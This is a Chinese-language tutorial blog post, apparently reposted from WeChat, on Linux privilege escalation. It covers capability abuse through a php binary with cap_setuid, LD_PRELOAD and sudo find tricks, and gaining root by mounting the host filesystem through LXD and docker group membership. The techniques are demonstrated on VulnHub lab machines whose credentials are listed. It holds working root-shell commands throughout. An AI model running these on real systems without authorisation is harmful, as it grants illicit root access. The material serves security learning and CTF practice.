---
title: "Linux提权（二）"
date: 2024-11-14
description: "Web&用户-Capability能力"
tags: []
categories: ["${folder}"]
---

**Web&用户-Capability能力**
-----------------------

### **前言**

Capability能力其实是属于suid提权，这是Linux特有的，他对文件进行细分，赋予文件不同的能力，文件就可以有不同的权限

简单说一下几个命令  
  
    设置能力：setcap cap\_setuid+ep /tmp/php  
    
    删除能力：setcap -r /tmp/php  
    
    查看单个能力：getcap /usr/bin/php  
    
    查看所有能力：getcap -r / 2>/dev/null  
 

Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。

这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。

如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。

### **过程**

前言提到命令  
#查看一下所有能力  

    getcap -r / 2>/dev/null  
    /usr/bin/fping cap\_net\_raw=ep  
    /usr/bin/ping cap\_net\_raw=ep  
    /usr/bin/dumpcap cap\_net\_admin,cap\_net\_raw=eip  
    /usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap\_net\_bind\_service,cap\_net\_admin=ep  
    /tmp/php cap\_setuid=ep  
  
###我们注意到cap后面跟了不一样的东西，这个就是细分权限具体参考下表  
  
  
    CAP\_CHOWN 0 允许改变文件的所有权  
    
    CAP\_DAC\_OVERRIDE 1 忽略对文件的所有DAC访问限制  
    
    CAP\_DAC\_READ\_SEARCH 2 忽略所有对读、搜索操作的限制  
    
    CAP\_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID  
    
    CAP\_FSETID 4 确保在文件被修改后不修改setuid/setgid位  
    
    CAP\_KILL 5 允许对不属于自己的进程发送信号  
    
    CAP\_SETGID 6 允许改变组ID  
    
    CAP\_SETUID 7 允许改变用户ID  
    
    CAP\_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程)  
    
    CAP\_LINUX\_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性  
    
    CAP\_NET\_BIND\_SERVICE 10 允许绑定到小于1024的端口  
    
    CAP\_NET\_BROADCAST 11 允许网络广播和多播访问(未使用)  
    
    CAP\_NET\_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等.  
    
    CAP\_NET\_RAW 13 允许使用原始(raw)套接字  
    
    CAP\_IPC\_LOCK 14 允许锁定共享内存片段  
    
    CAP\_IPC\_OWNER 15 忽略IPC所有权检查  
    
    CAP\_SYS\_MODULE 16 插入和删除内核模块  
    
    CAP\_SYS\_RAWIO 17 允许对ioperm/iopl的访问  
    
    CAP\_SYS\_CHROOT 18 允许使用chroot()系统调用  
    
    CAP\_SYS\_PTRACE 19 允许跟踪任何进程  
    
    CAP\_SYS\_PACCT 20 允许配置进程记帐(process accounting)  
    
    CAP\_SYS\_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等.  
    
    CAP\_SYS\_BOOT 22 允许重新启动系统  
    
    CAP\_SYS\_NICE 23 允许提升优先级，设置其它进程的优先级  
    
    CAP\_SYS\_RESOURCE 24 忽略资源限制  
    
    CAP\_SYS\_TIME 25 允许改变系统时钟  
    
    CAP\_SYS\_TTY\_CONFIG 26 允许配置TTY设备  
    
    CAP\_MKNOD 27 允许使用mknod()系统调用  
    
    CAP\_LEASE 28 允许在文件上建立租借锁  
    
    CAP\_SETFCAP 31 允许在指定的程序上授权能力给其它程序  
  
#我们看到php是有CAP\_SETUID 7 允许改变用户ID 的权限的  
/tmp/php cap\_setuid=ep  
  
###参考php执行命令  
#利用参考：  
https://gtfobins.github.io/  
  
  
    /tmp/php -r "posix\_setuid(0); system('/bin/sh');"  
  
  
反弹成功  
 

### **小坑**

getcap -r / 2>/dev/null有时候不回显，是因为终端不显示，我们需要弹一个新终端出来，或者使用上面写到的工具来筛选，还可以输入完整的地址来执行

例如

    /sbin/getcap -r / 2>/dev/null

**普通用户-LD\_Preload加载**
----------------------

### **前言**

其实Windows提权写到了dll提权，而在Linux提权里面是so文件，大体原理相同，简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的so文件来进行覆盖和劫持

LD\_PRELOAD允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数.假设现在出现了一种这样的情况，一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD\_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，这就会导致一些非预期的漏洞出现

LD\_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库

*   dll = windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可
    
*   so = linux 动态链接库文件
    

总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果

### **过程**

##看一下权限设置（可以用命令也可以用脚本工具）  

    vim /etc/sudoers  
  

    This file MUST be edited with the 'visudo' command as root.  

    Please consider adding local content in /etc/sudoers.d/ instead of  
    directly modifying this file.  

    See the man page for details on how to write a sudoers file.  

    Defaultsenv\_reset  
    Defaultsmail\_badpass  
    Defaultssecure\_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"  
    Defaultsuse\_pty  
    
    This preserves proxy settings from user environments of root  
    equivalent users (group sudo)  
    #Defaults:%sudo env\_keep += "http\_proxy https\_proxy ftp\_proxy all\_proxy no\_proxy"  
    
    This allows running arbitrary commands, but so does ALL, and it means  
    different sudoers have their choice of editor respected.  
    #Defaults:%sudo env\_keep += "EDITOR"  
    
    Completely harmless preservation of a user preference.  
    #Defaults:%sudo env\_keep += "GREP\_COLOR"  
    
    While you shouldn't normally run git as root, you need to with etckeeper  
    #Defaults:%sudo env\_keep += "GIT\_AUTHOR\_\* GIT\_COMMITTER\_\*"  
    
    Per-user preferences; root won't have sensible values for them.  
    #Defaults:%sudo env\_keep += "EMAIL DEBEMAIL DEBFULLNAME"  
    
    "sudo scp" or "sudo rsync" should be able to use your SSH agent.  
    #Defaults:%sudo env\_keep += "SSH\_AGENT\_PID SSH\_AUTH\_SOCK"  
    
    Ditto for GPG agent  
    #Defaults:%sudo env\_keep += "GPG\_AGENT\_INFO"  
    
    Host alias specification  
    
    User alias specification  
    
    Cmnd alias specification  
    
    User privilege specification  
    rootALL=(ALL:ALL) ALL  
    
    Allow members of group sudo to execute any command  
    %sudoALL=(ALL:ALL) ALL  
    
    See sudoers(5) for more information on "@include" directives:  
    
    @includedir /etc/sudoers.d  
  
 

然后把命令加进去(这个命令的意思)

    Defaults env\_keep += LD\_PRELOAD

加到下面这一块

    This file MUST be edited with the 'visudo' command as root.  

    Please consider adding local content in /etc/sudoers.d/ instead of  
    directly modifying this file.  

    See the man page for details on how to write a sudoers file.  

    Defaultsenv\_reset  
    Defaultsmail\_badpass  
    Defaultssecure\_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"  
    Defaultsuse\_pty  
    Defaults env\_keep += LD\_PRELOAD

加入用户权限

    mkbk ALL=(ALL:ALL) NOPASSWD: /usr/bin/find

前面提过sudo的find提权就不细说了

    $ sudo find . -exec /bin/sh \\; -quit

    id

    用户id=0(root) 组id=0(root) 组=0(root)  

 

**Linux系统提权-普通用户-LXD容器**
------------------------

### **前言**

在讲述以下三种提权之前，我们先搞清楚LXD、LXC和docker三种容器的区别。

### **LXD和LXC**

Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。

Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。

### **容器技术**

所谓的容器技术，也就是在主机操作系统中创建一个隔离的环境，以允许某个进程或应用程序在一个不影响主操作系统以及其他进程的环境下运行。

### **总结**

LXD是拉应用的容器，LXC是拉系统的容器

LXD和LXC是Linux自带的容器，而docke容器是第三方容器，LXD是一个root进程，它可以负责执行任意用户的LXD UNIX套接字写入访问操作。而且在某些情况下，LXD甚至都不会对调用它的用户权限进行检查和匹配，现在社区也有很多种方法可以利用LXD的这种特性来实施攻击。

其中的一项技术就是使用LXD API来将目标主机的根文件系统加载进一个容器中，而本文讨论的也是这项技术。一旦成功，攻击者就可以将低权限的用户提升为root权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源。

当然大部分情况不会出现该种提权，但是在面试和ctf、内网攻防比赛可能会出现该种提权

### **过程**

废话不多说直接开干

复现靶场

https://www.vulnhub.com/entry/ai-web-2,357/

通过ssh连接  
账号：n0nr00tuser  
Pass:zxowieoi4sdsadpEClDws1sf  
  
入口打点我就不讲了有wp  
  
  
进去看见权限后面跟了一个lxd，如果是docker就会跟一个docker  
  
    n0nr00tuser@aiweb2host:/var/www/html$ id  
    uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  
  
不能通过命令写入一句话木马到网站目录因为没有权限  
经过测试/tmp路径有权限写入我们可以上传提权检测脚本  
  
我用的是LinEnum项目  
  
检测出来 

    [+] We're a member of the (lxd) group - could possibly misuse these rights!  
    uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  
  
 

简单说一下流程

我们先传一个镜像过去，很小只有3mb，如果可以访问外网我们也可以下载一个镜像

https://github.com/saghul/lxd-alpine-builder

然后创建容器，挂载磁盘，进入容器，进入目录提权

先用lxc命令创建一个镜像，并且创建一个test用户 

    n0nr00tuser@aiweb2host:/tmp$ lxc image import ./alpine-v3.13-x86\_64-20210218\_0139.tar.gz --alias test  
  
    Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b  
  
再对这个镜像进行初始化  

    n0nr00tuser@aiweb2host:/tmp$ lxc init test test -c security.privileged=true  
  
    reating test  
  
设置一下镜像的路径  

    lxc config device add test test disk source=/ path=/mnt/root recursive=true  
  
解释一下这条命令 

    source=/ path=/mnt/root   这个的意思是把镜像的/mnt/root   代表根目录  
    /mnt/root/   而进入镜像以后根目录就是这个  
  
启动镜像  

    lxc start test  
  
然后进入镜像弹回一个终端  

    xc exec test /bin/sh  
  
提权成功  

    n0nr00tuser@aiweb2host:/tmp$ lxc exec test /bin/sh  
    ~ # id  
    uid=0(root) gid=0(root)  
  
 

**Linux系统提权-普通用户-Docker容器**
---------------------------

### **前言**

docker和lxd提权原理过程差不多，所以就不细说了，就是一些命令的不同

**docker容器内用户权限不受限**
--------------------

我们知道，用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。

正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。

**docker文件映射方便容器内外文件共享**
------------------------

在我们创建容器的时候，docker提供了一个`-v`选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。

然而便利倒是有了，但潜在了风险也是可想而知。

结合上面的两点便利，笔者想到一种普通用户借助docker突破权限的限制，达到本地提权的目的。

### **Docker本地提权条件:**

1、已经获得Shell

2、用户属于docker组

### **靶场**

https://www.vulnhub.com/entry/chill-hack-1,622/

1、入口点：

User: anurodh

Pass: !d0ntKn0wmYp@ssw0rd

### **过程**

检测及利用：  
  
    ./LinEnum.sh  
  
创建容器，挂载磁盘，进入容器，进入目录提权  
  
    docker run -v /:/mnt -it alpine  
    
    cd /mnt/root

**总结**
------

Linux提权总的来说分为三块：内核溢出提权，SUID&SUDO提权，虚拟镜像提权。本章节讲了这么多方法，万变不离其宗的就是权限分配不当，有许多方法是联动SUID&SUDO提权，只是中间过程绕了一下，讲这么多提权方法是为了应对面试和内网比赛，在实战中更可能遇到的是SUID&SUDO提权和内核提权，应该着重关注学习

完结！！！！

原文：[Linux提权（二）](https://mp.weixin.qq.com/s/xmCt7qGD78ROTdfs_LTD1g)
